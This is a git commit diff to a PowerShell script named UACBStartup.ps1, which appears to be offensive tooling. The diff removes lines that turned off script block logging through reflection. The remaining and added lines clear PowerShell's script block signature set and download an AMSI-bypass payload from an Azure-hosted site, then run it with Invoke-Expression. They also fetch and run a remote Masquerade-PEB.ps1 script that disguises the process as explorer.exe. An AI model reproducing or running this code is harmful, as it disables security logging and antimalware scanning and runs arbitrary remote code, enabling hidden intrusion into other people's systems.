99a03dd878958ba0bf6e47110398bfe6ed59b809
GєṭRєҡṭBȏʏ724/ <virusleader324@gmail.com>
2021-03-02 10:35:05 +0700

    Add files via upload

--- UACBStartup.ps1
+++ UACBStartup.ps1
@@ -1,12 +1,6 @@
-$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
-$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
-$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
-$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
 [ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
-$accessAMBY = Invoke-WebRequest https://amsi-fail.azurewebsites.net/api/Generate 
-$parseAMBY = ($accessAMBY -split '\r?\n').Trim()
-$AMBY = $parseAMBY[1..($parseAMBY.Length-1)]
-Invoke-Expression $AMBY
+$accessAMBY = Invoke-WebRequest https://amsi-fail.azurewebsites.net/api/Generate  -UseBasicParsing
+Invoke-Expression $accessAMBY.Content
 Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GetRektBoy724/sementara/master/Masquerade-PEB.ps1');
 MPEB -BinPath "C:\Windows\explorer.exe"
 MPEB -BinPath "C:\Windows\explorer.exe"
